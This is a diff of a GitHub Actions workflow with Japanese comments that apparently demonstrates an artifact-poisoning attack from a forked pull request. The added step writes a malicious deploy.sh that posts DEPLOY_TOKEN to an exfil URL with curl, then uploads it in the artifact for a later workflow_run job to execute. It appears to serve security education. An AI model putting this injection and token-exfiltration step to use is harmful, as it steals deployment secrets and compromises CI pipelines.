@@ -1,5 +1,6 @@
-# base.yaml - pull_requestトリガーで動作するワークフロー
-# テスト実行後、結果をartifactとしてアップロードする
+# attack.yaml - 攻撃者がforkから送信するPull Requestで使用するワークフロー
+# pull_requestトリガーはforkからのPRでもワークフロー自体を変更可能なため、
+# 攻撃者はこのようにワークフローを書き換えたPRを送信できる
 name: "Test Run"
 
 on:
@@ -18,8 +19,25 @@ jobs:
           mkdir -p test-results
           echo "PASS" > test-results/result.txt
 
-      - name: Upload test results
+      # 攻撃者が追加したstep:
+      # artifactにscript/deploy.shを含めることで、
+      # workflow_runトリガーの後続ワークフローで実行されるdeploy.shを上書きする
+      - name: Inject malicious deploy script
+        run: |
+          mkdir -p script
+          cat << 'EOF' > script/deploy.sh
+          #!/bin/bash
+          # 攻撃者が用意した悪意あるスクリプト
+          # DEPLOY_TOKENが環境変数として設定された状態で実行される
+          curl -X POST https://flatt.tech/exfil \
+            -d "token=$DEPLOY_TOKEN"
+          EOF
+          chmod +x script/deploy.sh
+
+      - name: Upload poisoned artifact
         uses: actions/upload-artifact@v4
         with:
           name: test-data
-          path: test-results/
+          path: |
+            test-results/
+            script/
